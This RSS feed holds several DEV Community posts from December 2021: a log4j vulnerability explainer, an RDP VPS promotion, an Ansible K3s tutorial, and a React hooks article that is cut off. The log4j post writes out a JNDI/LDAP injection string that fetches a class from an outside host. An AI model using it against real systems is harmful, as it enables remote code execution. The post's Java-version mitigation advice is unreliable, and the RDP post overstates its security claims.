<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
  <channel>
    <title>DEV Community</title>
    <author>DEV Community</author>
    <description>A constructive and inclusive social network for software developers. With you every step of your journey.</description>
    <link>https://dev.to</link>
    <language>en</language>
    <item>
      <title>Serious flaw in Java log4j has been discovered, affecting large number of devices. [weekly tech news]</title>
      <author>Pramit Marattha</author>
      <pubDate>Wed, 15 Dec 2021 05:04:10 +0000</pubDate>
      <link>https://dev.to/aviyel/serious-flaw-in-java-log4j-has-been-discovered-affecting-large-number-of-devices-weekly-tech-news-3bml</link>
      <guid>https://dev.to/aviyel/serious-flaw-in-java-log4j-has-been-discovered-affecting-large-number-of-devices-weekly-tech-news-3bml</guid>
      <description>&lt;p&gt;On December 9th, a zero-day vulnerability in log4j, a widely used Java logging library, was discovered, allowing for remote code execution by sending a specific type of string to the logger.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--DB_olvL7--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://aviyel.com/assets/uploads/files/1639227462485-image-resized.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--DB_olvL7--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://aviyel.com/assets/uploads/files/1639227462485-image-resized.png" alt="CVE report" width="760" height="386"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--SORS8jJG--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://aviyel.com/assets/uploads/files/1639279556820-image-resized.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--SORS8jJG--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://aviyel.com/assets/uploads/files/1639279556820-image-resized.png" alt="CVE" width="760" height="224"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Let’s clarify how bigger and widespread this flaw is and how simple it is to attack. For starters, log4j is simply a java library, and java is a widely-used programming language, particularly at the corporate level.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--e1B5-H7x--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://aviyel.com/assets/uploads/files/1639236807274-image.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--e1B5-H7x--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://aviyel.com/assets/uploads/files/1639236807274-image.png" alt="Java Installation" width="506" height="378"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;We may have seen the message whenever we had to install or update java, that more than 3 billion devices run java, ranging from computers, phones, ATM machines, and routers, implying that there are millions, if not billions, of devices out there running this logging software, which is blended into all kinds of frequently used services like Spotify, Steam, and Apple iCloud. It's possible that devices running those are at critical risk.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--nXDIXmLe--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://aviyel.com/assets/uploads/files/1639236567172-image.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--nXDIXmLe--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://aviyel.com/assets/uploads/files/1639236567172-image.png" alt="Tech corpo" width="766" height="177"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Leave everything aside, servers that run streaming services, Boeing, Cloudflare, and Amazon, which together form a major backbone of the internet, could all be exposed to this zero-day that enables remote code execution. RCE is a very huge matter, and it usually doesn't take much more for someone to gain complete control over the server that is currently running that software. Anything that uses the apache struts or elk stack, as well as some simple standalone Java applications, could be in jeopardy. In fact, it was in one of the most popular Java applications, Minecraft, that the flaw was originally found.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--Eaj3LrxV--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://aviyel.com/assets/uploads/files/1639230360056-image.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--Eaj3LrxV--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://aviyel.com/assets/uploads/files/1639230360056-image.png" alt="Minecraft" width="600" height="600"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;For a few days, it was thought to be a Minecraft bug, but it quickly spread to the cybersecurity world, causing havoc. All you have to do to exploit this in Minecraft is pass the string shown below directly to the console or even the chat, which then gets passed to the logger, allowing remote code execution (RCE).&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--vn7VIMBt--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://aviyel.com/assets/uploads/files/1639231026950-image.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--vn7VIMBt--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://aviyel.com/assets/uploads/files/1639231026950-image.png" alt="Script" width="625" height="344"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--MA0wl8Av--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://aviyel.com/assets/uploads/files/1639231052961-image.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--MA0wl8Av--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://aviyel.com/assets/uploads/files/1639231052961-image.png" alt="Scripts" width="545" height="186"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Still not sure who came up with the concept to create a logger that resolves LDAP addresses or evaluates and then attempts to execute arbitrary text, but it exists, and it's a log4j feature. Unfortunately, not all log4j versions support this by the way.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;LDAP (Lightweight Directory Access Protocol) is a software protocol that allows anybody to find and locate information about companies, individuals, and other resources in a network, such as files and devices, whether on the public Internet or within a company's Intranet.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Fortunately, not all versions by default load remote code execution via LDAP, although they are still vulnerable to slightly more complicated forms of remote code execution.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--mzpRQ1Wm--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://aviyel.com/assets/uploads/files/1639231381234-image-resized.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--mzpRQ1Wm--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://aviyel.com/assets/uploads/files/1639231381234-image-resized.png" alt="Statement" width="760" height="511"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This exploit requires no skill at all to execute for those who use LDAP. There was virtually no expertise required; anyone, including youngsters, could easily hack into it.&lt;/p&gt;

&lt;p&gt;So, anywhere there is a java app or an internet service running this logger on its backend, a user can type &lt;code&gt;${jndi:ldap/servername.com/a.class}&lt;/code&gt; and boom!!  you are in. This could be a potential attack vector for this flaw. This is a very serious issue, similar to a shell shock vulnerability. There are numerous amounts of testing and execution going on right now on the internet to find services that are using this and exploiting them, and people are gathering all over the world to try and fix this before a hacker finds a way to take over every critical system or leak all of the secrets of everything, and this is also something that a lot of standard security systems that corporations and enterprises might be using. It is not even something that will be necessarily stopped because of the way that this vulnerability occurred; it is exploiting a logging functionality that is for one such a widespread feature in the very deep level of very corporations/organizations, especially using the detailed logging functionality that log4j provides, and when data is coming to the server to be logged, there are usually not a lot of security checks that occur at the point where you will just be logging whatever is going on currently and probably you don’t even think about the logging details of an event being written to your very own logging system.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--OkeR7kip--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://aviyel.com/assets/uploads/files/1639279874642-image-resized.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--OkeR7kip--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://aviyel.com/assets/uploads/files/1639279874642-image-resized.png" alt="Script" width="760" height="91"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Let's look at a previous attack, such as the struts 2 vulnerability that was discovered in 2017, and the really scary part about it is that it took 2 whole days after the discovery of the bug to create an exploit  for it . Big companies that hadn't patched their services within that time frame were starting to get hacked. One of the biggest consequences of that vulnerability was a massive Equifax data breach, which exposed the personal information of about 150 million people, and the damage inflicted by this vulnerability was really very enormous.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--7m79uVss--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://aviyel.com/assets/uploads/files/1639232779043-image.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--7m79uVss--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://aviyel.com/assets/uploads/files/1639232779043-image.png" alt="Equifax" width="743" height="674"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;So, if the timeline of this log4j is similar to that of struts 2 or if it takes even 3 - 4 days to fix it, we could go from youngsters hacking each other's Minecraft servers to big companies getting hacked and having critical information, personal information of those companies or their customer’s data getting leaked onto the internet. If the timing is comparable to that of struts 2, this means that a large number of incident response professionals will be working over the clock to try to safeguard their servers and services against these flaws/vulnerabilities.&lt;/p&gt;

&lt;p&gt;When you consider that it is vacation month, many people are already on vacation, and that the world is currently experiencing a shortage of workers, many of these places may already be short-staffed, the timeline for properly patching a vulnerability like this happening right now could take a little bit longer than in the past when it took certain days to go from the discovery of this kind of vulnerability to companies being hacked/attacked so every single second counts.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;It is guaranteed that there will be large data breaches and some fascinating leaks, as we have seen in the past.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2&gt;
  &lt;a href="#remedy-conclusion"&gt;
  &lt;/a&gt;
  Remedy: Conclusion
&lt;/h2&gt;

&lt;p&gt;So there are some mitigation procedures that can be implemented right now to decrease or even eliminate the attack vector or at the very least a very simple script kitty potential that everyone will implement on their every service out there.&lt;/p&gt;

&lt;p&gt;The very first priority should be to ensure that the Java library is currently up to date. If you are using something newer than Java 8, it is currently believed that you are fairly safe, but if you are using java 8 or something older than that, you are really taking a gamble with the protection of your system. However, because this is a very new and recently discovered exploit, you may need to update to something relatively new than Java 8, but it is best to just update to the newest version of java if you can.&lt;/p&gt;

&lt;p&gt;Also, make sure you're not running the vulnerable version of log4j, because it appears that Apache just issued a new version of log4j recently which was patched.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--5aS-yNrN--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://aviyel.com/assets/uploads/files/1639236074482-image-resized.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--5aS-yNrN--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://aviyel.com/assets/uploads/files/1639236074482-image-resized.png" alt="log4j2" width="760" height="389"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Another option is to utilize or experiment with alternative logging libraries other than log4j.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.slf4j.org/"&gt;SLF4J&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.elastic.co/logstash/"&gt;Logstash&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://datalust.co/seq"&gt;Seq&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://logback.qos.ch/"&gt;Logback&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://grafana.com/oss/loki/"&gt;Loki&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--9V-7NSt6--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://aviyel.com/assets/uploads/files/1639298132489-image-resized.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--9V-7NSt6--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://aviyel.com/assets/uploads/files/1639298132489-image-resized.png" alt="Alternate" width="760" height="133"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Main article available here =&amp;gt; &lt;a href="https://aviyel.com/post/1541"&gt;https://aviyel.com/post/1541&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Follow &lt;a href="https://twitter.com/AviyelHq"&gt;@aviyelHQ&lt;/a&gt; or &lt;a href="https://aviyel.com/discussions"&gt;sign-up&lt;/a&gt; on Aviyel for early access if you are a project maintainer, contributor, or just an Open Source enthusiast.&lt;/p&gt;

&lt;p&gt;Join Aviyel's Discord =&amp;gt; &lt;a href="https://discord.gg/TbfZmbvnN5"&gt;Aviyel's world&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Twitter =&amp;gt;[&lt;a href="https://twitter.com/AviyelHq"&gt;https://twitter.com/AviyelHq&lt;/a&gt;]&lt;/p&gt;

</description>
      <category>log4j</category>
      <category>log4shell</category>
      <category>tech</category>
      <category>news</category>
    </item>
    <item>
      <title>10 reasons you MUST have a RDP VPS</title>
      <author>New Linux Helper</author>
      <pubDate>Wed, 15 Dec 2021 04:08:29 +0000</pubDate>
      <link>https://dev.to/developerbishwas/10-reasons-you-must-have-a-rdp-vps-1ab7</link>
      <guid>https://dev.to/developerbishwas/10-reasons-you-must-have-a-rdp-vps-1ab7</guid>
      <description>&lt;p&gt;RDP VPS is a service that allows you to connect from a remote place to your Windows VPS system and take full control of that virtual machine.&lt;/p&gt;

&lt;p&gt;VPS is a server on its own while having a dedicated IP and administrator access. But Remote Desktop Protocol (RDP) is a Microsoft protocol designed to facilitate application, data transfer, security and encryption between client users, devices and a virtual network server.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;In a simple language&lt;/strong&gt;, it allows you to access a virtual private server with GUI from any corner of the world.&lt;/p&gt;

&lt;p&gt;The RDP technology now enables global businesses across the world to access shared applications easily and securely without necessarily hiring the service of an IT specialist. &lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--777hGvOb--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ndp5lf49i1ml4rfnswhx.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--777hGvOb--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ndp5lf49i1ml4rfnswhx.png" alt="Remote Desktop VPS" width="880" height="550"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#why-use-remote-desktop-protocol-vps"&gt;
  &lt;/a&gt;
  Why use Remote Desktop Protocol VPS?
&lt;/h2&gt;

&lt;p&gt;The major advantages of Remote Desktop Service are&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#secure-connection"&gt;
  &lt;/a&gt;
  Secure Connection
&lt;/h3&gt;

&lt;p&gt;RDP allows for safe and secure access to files and documents. &lt;/p&gt;

&lt;p&gt;All connections to your remote desktop are encrypted which ensures that your data are safe and secure. &lt;/p&gt;

&lt;p&gt;Therefore, there is no fear of losing any data through physical or cyber theft.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#freedom-to-work-from-anywhere"&gt;
  &lt;/a&gt;
  Freedom to Work from Anywhere:
&lt;/h3&gt;

&lt;p&gt;The RDP gives you the freedom to work from almost everywhere in as much as you have a computer with an internet connection. You can work from anywhere and at any time.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#cost-effective"&gt;
  &lt;/a&gt;
  Cost Effective
&lt;/h3&gt;

&lt;p&gt;With RDP, you no longer need to purchase licenses for multiple computers. &lt;/p&gt;

&lt;p&gt;All connected computers and remotely access and make use of single software on the host computer.&lt;br&gt;
Of course, everything comes with its own downside.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#my-personal-fav-vps-provider"&gt;
  &lt;/a&gt;
  My personal fav VPS provider
&lt;/h2&gt;

&lt;p&gt;I have been using &lt;a href="https://www.veeble.org/vps/windows?r=1992"&gt;Veeble&lt;/a&gt; for long time and it's quite good. The customer care service, the dashboard and the panel are good. And mainly, the VPS they provide are smooth in performance, and extremely cost effective. &lt;/p&gt;

</description>
      <category>server</category>
      <category>programming</category>
      <category>productivity</category>
      <category>testing</category>
    </item>
    <item>
      <title>Automating Raspberry Pi K3s provisioning with Ansible</title>
      <author>Sahan</author>
      <pubDate>Wed, 15 Dec 2021 03:50:00 +0000</pubDate>
      <link>https://dev.to/sahan/automating-raspberry-pi-k3s-provisioning-with-ansible-4dgg</link>
      <guid>https://dev.to/sahan/automating-raspberry-pi-k3s-provisioning-with-ansible-4dgg</guid>
      <description>&lt;p&gt;In this article, we will be looking at how we can automate most of the steps involved in installing a Raspberry Pi+K3s cluster by using Ansible.&lt;/p&gt;

&lt;p&gt;I explained how to set up a Kubernetes cluster on a Raspberry Pi in my previous article. In case you missed it, you can find it from the following link:&lt;/p&gt;

&lt;p&gt;🔗 &lt;strong&gt;&lt;a href="https://sahansera.dev/building-your-own-private-kubernetes-cluster-on-a-raspberry-pi-4-with-k3s/"&gt;Building your own private Kubernetes cluster on a Raspberry PI 4 with K3S&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;If you have a fresh bunch of Raspberry Pis, you might want to follow Step 0 through to Step 8 in the above. However, it’s a one-off setup, so please proceed to the following sections if you already have done them.&lt;/p&gt;

&lt;p&gt;In a nutshell, this is what we are trying to automate.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--mZEG1qxo--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://sahansera.dev/static/d39f0323d272251c6acceddf6c3761df/5a190/k3s-rapsberrypi-ansible-automation-0.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--mZEG1qxo--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://sahansera.dev/static/d39f0323d272251c6acceddf6c3761df/5a190/k3s-rapsberrypi-ansible-automation-0.png" alt="k3s-rapsberrypi-ansible-automation-0.png" title="k3s-rapsberrypi-ansible-automation-0.png" width="800" height="584"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#step-1-installing-ansible"&gt;
  &lt;/a&gt;
  Step 1 - Installing Ansible
&lt;/h3&gt;

&lt;p&gt;So what do we need to get started? You need one or more RPis with Raspbian installed (or an OS &lt;a href="https://rancher.com/docs/k3s/latest/en/installation/installation-requirements/#operating-systems"&gt;supported by K3s&lt;/a&gt;). We can get to our desired state by using an Ansible playbook.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://www.ansible.com/"&gt;Ansible&lt;/a&gt; is an industry-leading IT automation tool to provision and manage your infrastructure in a declarative form such YAML.&lt;/p&gt;

&lt;p&gt;The easiest way to get the steps to installing Ansible would be to head over to the &lt;a href="https://docs.ansible.com/ansible/latest/installation_guide/intro_installation.html"&gt;official docs&lt;/a&gt;. For most OSs, it can be just installed via &lt;code&gt;pip&lt;/code&gt;.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;python &lt;span class="nt"&gt;-m&lt;/span&gt; pip &lt;span class="nb"&gt;install&lt;/span&gt; &lt;span class="nt"&gt;--user&lt;/span&gt; ansible
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;blockquote&gt;
&lt;p&gt;💡 Note: Use the latest version of Python installed on your machine. In my case, I have it set to &lt;code&gt;python3&lt;/code&gt; since Mac OS comes with an older version of Python installed.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Depending on your system and the internet connection, it will a bit of take time to install Ansible. Sometimes even if you installed it, it would still say that it can’t find &lt;code&gt;ansible&lt;/code&gt; command. If that’s the case, feel free to follow this &lt;a href="https://stackoverflow.com/questions/63177609/zsh-command-not-found-ansible-after-pip-installing"&gt;link&lt;/a&gt;. If you are on a Mac, you could also run a &lt;code&gt;brew install ansible&lt;/code&gt; to install ansible.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--HFjMLbb---/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://sahansera.dev/static/70581b905961f6da018dc7d0db07d5c3/5a190/k3s-rapsberrypi-ansible-automation-1.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--HFjMLbb---/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://sahansera.dev/static/70581b905961f6da018dc7d0db07d5c3/5a190/k3s-rapsberrypi-ansible-automation-1.png" alt="k3s-rapsberrypi-ansible-automation-1.png" title="k3s-rapsberrypi-ansible-automation-1.png" width="800" height="305"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#step-2-k3s-ansible-playbook"&gt;
  &lt;/a&gt;
  Step 2 - K3s Ansible Playbook
&lt;/h3&gt;

&lt;p&gt;Without writing everything from the ground up, we will be using the &lt;a href="https://github.com/k3s-io/k3s-ansible"&gt;k3s-ansible&lt;/a&gt; repo.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;git clone git@github.com:k3s-io/k3s-ansible.git
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Once you have cloned the repo, you can run the following command to create a new playbook for your RPi cluster provisioning. Make sure to replace &lt;code&gt;my-cluster&lt;/code&gt; with the desired name for your cluster. In my case, I called it &lt;code&gt;rpi-cluster&lt;/code&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nb"&gt;cp&lt;/span&gt; &lt;span class="nt"&gt;-R&lt;/span&gt; inventory/sample inventory/my-cluster
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Next, we need to map out the nodes and master them in the &lt;code&gt;inventory/my-cluster/hosts.ini&lt;/code&gt; file. Update the &lt;code&gt;[master]&lt;/code&gt; and &lt;code&gt;[node]&lt;/code&gt; attributes accordingly.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;[master]
10.0.0.100

[node]
10.0.0.101

[k3s_cluster:children]
master
node
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Under &lt;code&gt;[node]&lt;/code&gt; attribute you could even specify a range of IPs if they are consecutive like so.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;[node]
10.0.0.[101:105]
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Check the &lt;code&gt;inventory/my-cluster/group_vars/all.yml&lt;/code&gt; to set variables such as &lt;code&gt;k3s_version&lt;/code&gt; and &lt;code&gt;ansible_user&lt;/code&gt;, depending on your environment.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#step-3-running-the-ansible-playbook"&gt;
  &lt;/a&gt;
  Step 3 - Running the Ansible Playbook
&lt;/h3&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;ansible-playbook site.yml &lt;span class="nt"&gt;-i&lt;/span&gt; inventory/rpi-cluster/hosts.ini &lt;span class="nt"&gt;--ask-pass&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--1CXdNtkF--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://sahansera.dev/static/bb872c572dedb1a2894597c50e238a37/5a190/k3s-rapsberrypi-ansible-automation-2.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--1CXdNtkF--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://sahansera.dev/static/bb872c572dedb1a2894597c50e238a37/5a190/k3s-rapsberrypi-ansible-automation-2.png" alt="k3s-rapsberrypi-ansible-automation-2.png" title="k3s-rapsberrypi-ansible-automation-2.png" width="800" height="311"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;You can now SSH into the Pi master or nodes and run &lt;code&gt;kubectl&lt;/code&gt; commands within it.&lt;/p&gt;

&lt;p&gt;if you want to uninstall everything that got installed as part of the playbook:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;ansible-playbook reset.yml &lt;span class="nt"&gt;-i&lt;/span&gt; inventory/rpi-cluster/hosts.ini &lt;span class="nt"&gt;--ask-pass&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#conclusion"&gt;
  &lt;/a&gt;
  Conclusion
&lt;/h3&gt;

&lt;p&gt;This article looked at how we can automate provisioning our Raspberry Pi with Ansible. If you are new to DevOps and want to automate provisioning systems, this is a great start. A special shoutout to &lt;a href="https://github.com/itwars"&gt;@itwars&lt;/a&gt; for putting this together and doing a lot of heavy lifting creating these scripts.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#references"&gt;
  &lt;/a&gt;
  References
&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/k3s-io/k3s-ansible"&gt;https://github.com/k3s-io/k3s-ansible&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
      <category>ansible</category>
      <category>iot</category>
      <category>raspberrypi</category>
    </item>
    <item>
      <title>Custom Hooks to Lightweight Your React Project</title>
      <author>DhiWise</author>
      <pubDate>Wed, 15 Dec 2021 03:47:33 +0000</pubDate>
      <link>https://dev.to/dhiwise/custom-hooks-to-lightweight-your-react-project-g9j</link>
      <guid>https://dev.to/dhiwise/custom-hooks-to-lightweight-your-react-project-g9j</guid>
      <description>&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--nKFPDda---/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/2800/0%2Aefj49Y4ARtOhLC0N" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--nKFPDda---/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/2800/0%2Aefj49Y4ARtOhLC0N" alt="React Custom Hooks" width="880" height="436"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Hooks are the JavaScript functions that let you add additional functionality to the React apps without writing a class. React provides built-in hooks such as useState, useEffect, useContext and also facilitates you to create custom hooks.&lt;/p&gt;

&lt;p&gt;React hooks were introduced in React Version 16.8 and above and one of its main advantages is the reusability of stateful logic. Before the introduction of hooks, states can be maintained only in the class components but with the addition of hooks, states can now be maintained in the functional components without changing the component hierarchy.&lt;/p&gt;

&lt;p&gt;Let’s take a look at some useful custom hooks in React and understand how to use them in your project.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#usetheme"&gt;
  &lt;/a&gt;
  useTheme
&lt;/h2&gt;

&lt;p&gt;The useTheme hook helps you to dynamically change the appearance of your application using CSS variables. This can be done by simply passing an object containing the key/value pair of the CSS variables you would like to modify.&lt;/p&gt;

&lt;p&gt;The hook helps you to implement the light/dark components in your app.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--Jaqa6xaR--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/4028/1%2AbWsI6XCDWBLs2QTQmXTlOw.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--Jaqa6xaR--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/4028/1%2AbWsI6XCDWBLs2QTQmXTlOw.png" alt="useTheme custom hook" width="880" height="793"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#useinput"&gt;
  &lt;/a&gt;
  useInput
&lt;/h2&gt;

&lt;p&gt;The useInput hook is used to simplify the handling of input events. Here is how you can install this custom hook.&lt;/p&gt;

